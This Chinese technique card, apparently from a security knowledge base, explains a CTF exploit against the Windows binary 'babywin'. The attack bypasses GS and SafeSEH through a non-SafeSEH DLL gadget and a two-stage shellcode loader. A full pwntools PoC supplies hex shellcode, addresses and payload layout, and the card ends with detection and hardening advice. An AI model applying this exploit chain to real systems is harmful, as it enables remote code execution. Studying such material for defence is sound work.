---
id: code-analysis-reverse-windows-gs-safeseh-combined-two-stage-shellcode
title: Win32 GS+SafeSEH 组合绕过：SEH 指向非 SafeSEH DLL gadget，fgets 两段式读入完整 shellcode
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: win32-gs-safeseh-combined-dll-gadget-two-stage-shellcode
tags:
- pwn
- stack
- windows
- gs
- canary
- seh
- safeseh
- shellcode
- x86
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-12'
verification:
  verified_by: verifier-V557
  verified_at: '2026-11-12T00:39:28+08:00'
  notes: 已对照原文与7张截图核对：checksec babywin(NX No/Canary Yes/ASLR No/SafeSEH Yes)、gift.dll(SafeSEH No)、__except_handler4(.text:00401B28)、gadget 0x271F19F5(pop esi;pop ebx;retn)与脚本 pop2=0x271f16ac、payload=首段.ljust(120)+EB86AAAA+p32(pop2)+cmd.exe、第二包 \xcc+msfvenom、dir 回显均与原文一致。修正：1) 原理中短跳表述按实际脚本改为 EB 86 从 SEH 记录起始回跳 0x7A 到首段（原文正文提到的 jmp $+8 另注）；2) PoC 首段由省略版补全为原文完整 59 字节（已校验无 \x00/\n）。dedup：自身 exact；与 code-analysis-reverse-windows-gs-seh-overwrite-bypass 为 likely_duplicate(cos 0.9405)，但该卡触发条件明确『未启用 SafeSEH』、handler 直接指缓冲区，本卡是 SafeSEH 开启+无 SafeSEH 表 DLL 的 pop/pop/ret 跳板+EstablisherFrame 短跳+两段式 fgets 的组合实战，触发条件与链不同；与 safeseh-unregistered-module-trampoline-bypass(related 0.9032) 仅共享核心机制，不含 GS/strcpy+strcat 双写/两段输入。force add 理由成立，保留。原文对首段寄存器推演较简略，confidence medium 合理；PoC 未在本机执行。
url: /docs/code-analysis/reverse/windows/code-analysis-reverse-windows-gs-safeseh-combined-two-stage-shellcode/
draft: false
kb_aliases:
- babywin GS+SafeSEH 绕过
- GS 与 SafeSEH 同时开启的利用
- SafeSEH 借非 SafeSEH DLL 跳板
- 两段式 shellcode fgets
- win_server pwntools Windows pwn
---

## 一句话结论

当 32 位 Windows 程序同时开启 GS（canary）与 SafeSEH、栈溢出入口又是 `strcpy/strcat`（禁止输入 `\x00`）、单次输入长度受限时，可覆盖栈上的 SEH 记录把异常处理指针指向一个**未启用 SafeSEH 的 DLL**（示例为 `gift.dll`）中的 gadget：SafeSEH 只对「handler 位于模块内」的情况查安全表，来自无 SafeSEH 表的模块的 handler 直接放行；异常分发先于 canary 校验执行，再借栈上可控指针把执行流导入首段 shellcode；首段用 XOR 掩码解析 `__acrt_iob_func`/`fgets`（全程无 `\x00`），从 stdin 二次读入 200+ 字节的 msfvenom 载荷并跳转，从而在输入长度受限的情况下完成 getshell。

## 原理

- **GS 与 SEH 的先后关系**：`/GS` 的 canary 校验只在函数正常返回时执行；栈溢出破坏 SEH 记录后，只要在返回前触发异常（访问违例、被破坏的指针等），异常分发会先遍历 SEH 链调用 handler，canary 检查被完全跳过。这就是 GS 开启时仍可打 SEH 的根本原因。
- **SafeSEH 的检查边界**：`RtlDispatchException`/`RtlIsValidHandler` 先拒绝指向当前栈的 handler；对位于已加载模块内的 handler，再查该模块的 SafeSEH 安全表；若 handler 指向**没有启用 SafeSEH 的模块**，该模块没有表可查，校验直接放行。主程序开了 SafeSEH 不代表其加载的第三方 DLL 也开；示例题目附带的 `gift.dll` 即无 SafeSEH（checksec 显示 `SafeSEH: No`），其中的 `pop ecx; pop ebp; ret` / `pop esi; pop ebx; ret` 等 gadget 可被当作合法 handler。
- **栈上指针槽与短跳**：示例在栈上存在一个可被覆盖的槽位 `0x0019FF64`（位于被覆盖的 `__except_handler4` 位置上方），它指向一段我们同样能覆盖的栈内存。`pop ecx; pop ebp; ret` 类跳板被调用后，两次 `pop` 消耗返回地址与 `ExceptionRecord`，`ret` 落到 `EstablisherFrame`（即 SEH 记录起始，也就是该槽位）；该 4 字节在 payload 中被写成短跳 `EB 86 AA AA`，从记录起始回跳 0x7A 字节，正好落到缓冲区开头的首段 shellcode（原文正文另提到 `jmp $+8` 的向前跳法，实际脚本用的是 `EB 86` 回跳）。
- **两段式 shellcode 的原因**：`strcpy` 到 32 字节缓冲、`strcat` 再追加一次，输入既不能含 `\x00`（会截断），单次也仅约 200 字节，而 msfvenom 生成的 `cmd.exe` 反向/绑定 shell 往往 200+ 字节且含空字节。首段 shellcode 因此只做一件事：调用 `__acrt_iob_func(0)` 取 `stdin` 的 `FILE*`，再调用 `fgets` 从同一连接读入第二段任意字节到可执行栈地址，然后跳过去。
- **无 `\x00` 技巧**：首段把所有 API 地址写成「真实地址 XOR 0x01010101」的形式，运行时 `xor eax, ecx` 还原；字符串（`cmd`、`syst`、`em`、`cmd.exe`）在栈上分段构造；用 `test/jnz` + `call` 回跳的写法在无空字节前提下得到零值/地址。第二段（msfvenom 载荷）从网络读入，不受首段字符集限制。
- **为什么能稳定命中**：示例程序 NX/ASLR 均关闭（checksec：NX No、ASLR No、Canary Yes、SafeSEH Yes），栈可执行且地址固定，首段与第二段都落在固定栈/可执行区域，跳转无需泄露。

## 触发条件

- 32 位 Windows x86 程序，`/GS` 与 SafeSEH 同时开启，NX/ASLR 关闭或可绕过（示例 CTF 题 babywin）。
- 栈溢出入口使用 `strcpy`+`strcat` 等会截断 `\x00` 的复制方式，且单次可输入长度受限。
- 进程加载了至少一个未启用 SafeSEH 的模块（示例 `gift.dll`），且该模块内有可用跳板 gadget。
- 能触发异常进入 SEH 分发（覆盖 canary、非法指针等），且栈上存在可被覆盖的、指向受控内存的指针槽。
- 调试/利用环境可用 `win_server` + pwntools 的 `remote` 连接目标进程（解决 pwntools 无法直接启动 exe 的问题）。

## 利用步骤

1. `checksec.exe` 确认保护组合：示例为 `NX No / Canary Yes / ASLR No / SafeSEH Yes`；用反汇编确认存在 `__except_handler4`（SEH 记录在栈上）和 `strcpy/strcat` 溢出点。
2. 对随包 DLL（如 `gift.dll`）跑 checksec，找 `SafeSEH: No` 的模块；反汇编其代码段找 `pop ecx; pop ebp; ret`、`pop esi; pop ebx; ret` 等跳板，并记录地址（示例 `0x271F16AC`、`0x271F19F5`，随 DLL 基址变化）。
3. 在调试器里观察栈：定位 `__except_handler4` 被覆盖的位置及其上方可覆盖的栈指针槽（示例 `0x0019FF64`），计算偏移。
4. 编写首段 shellcode（<120 字节）：XOR 掩码解析 `__acrt_iob_func`/`fgets`，取 stdin、`fgets` 读入第二段、跳转；确保不含 `\x00` 与换行。
5. 组装第一包：`首段.ljust(120, b'\xAA') + b'\xeb\x86\xAA\xAA' + p32(pop2) + b'cmd.exe'`（短跳+跳板+字符串），经 `sendlineafter('data:', ...)` 发送，触发覆盖与异常。
6. 立即发送第二包：`b'\xcc' + msfvenom_shell`（首字节可为断点/填充），由首段 `fgets` 读入并执行。
7. `interactive()` 接管 shell；示例成功执行 `dir`。

## PoC

```python
from pwn import *

context.arch = 'i386'
pop2 = 0x271f16ac                     # gift.dll: pop ecx; pop ebp; ret（随基址变化）
p = remote("127.0.0.1", 1234)         # win_server.exe babywin.exe 1234

shell = b'...'                        # msfvenom -f raw 生成的 cmd.exe 载荷（200+ 字节）

# 原文完整首段（59 字节，不含 \x00）
stage1 = bytes.fromhex(
    'b901010101b8bd21410131c88b18'   # mov ecx,0x01010101; mov eax,__acrt_iob_func^0x01010101; xor eax,ecx; mov ebx,[eax]
    '31c951ffd35950'                 # xor ecx,ecx; push ecx; call ebx; pop ecx; push eax(FILE*)
    'b9010101015131c0505885c07505'   # mov ecx,0x01010101; push ecx; xor eax,eax; push eax; pop eax; test eax,eax; jnz +5
    'e8f6ffffff662d103050'           # call 回跳; sub ax,0x3010; push eax
    'b8c121410131c88b18'             # mov eax,fgets^0x01010101; xor eax,ecx; mov ebx,[eax]
    'ffd35bffe3'                     # call fgets; pop ebx; jmp ebx
)
assert b'\x00' not in stage1 and b'\n' not in stage1

payload = stage1.ljust(120, b'\xAA') + b'\xeb\x86\xAA\xAA' + p32(pop2) + b'cmd.exe'
p.sendlineafter(b'data:', payload)
p.sendline(b'\xcc' + shell)           # 第二段由首段 fgets 读入
p.interactive()
```

```text
# 预期：第二包读入后跳转执行，得到 Windows 命令 shell（示例 dir 有回显）
```

## 变体与关联

- 关联：[[code-analysis-reverse-windows-gs-seh-overwrite-bypass]]（GS 开启时用 SEH 覆盖绕过 canary 的通用原理，本例是其 CTF 实战组合）。
- 关联：[[code-analysis-reverse-windows-safeseh-unregistered-module-trampoline-bypass]]（SafeSEH 只查「模块内」handler 的机制与 pop pop ret 跳板；本例直接借 `gift.dll` 的 pop-pop-ret 类 gadget 作 handler/跳转）。
- 关联：[[code-analysis-reverse-windows-safeseh-heap-handler-bypass]]、[[code-analysis-reverse-windows-sehop-chain-forge-bypass]]（若目标还开 SEHOP 或 handler 落点受限，需要对应的绕过变体）。
- 变体：首段也可只做栈迁移/`VirtualProtect`，把大载荷放在堆或数据段；两段式的核心是「用一次受限输入换一次不受限读入」。
- 变体：调试环境用 `win_server.exe <target> <port>` + pwntools `remote`，可在 Linux 侧统一写脚本；Windows 下首段 shellcode 建议在 Linux 用 pwntools/keystone 汇编（示例汇编在 Windows 编译器下不通过）。

## 检测与防御

- 加固：所有模块（含第三方 DLL）统一启用 `/SAFESEH`、`/GS`、`/DYNAMICBASE`、`/NXCOMPAT`、CFG；开启 SEHOP。
- 加固：禁止使用 `strcpy/strcat/gets` 等无长度限制函数，改用 `strcpy_s/strcat_s` 或显式长度校验；对输入长度与字符集做限制不能替代安全函数。
- 检测：进程异常记录中出现 `__except_handler4` 被改写、handler 指向非预期模块（尤其无 SafeSEH 的第三方 DLL）的崩溃转储；异常分发前后 EIP 落在栈/数据区的行为。
- 检测：CTF/实验环境中出现 `win_server` 类进程转发与异常连续两次输入（第二段含 `\xcc` 前缀）的特征；生产环境应禁止此类调试转发工具。
- 边界：本卡全部偏移/地址为示例题目值，实际目标需重新测量；仅在授权环境使用。
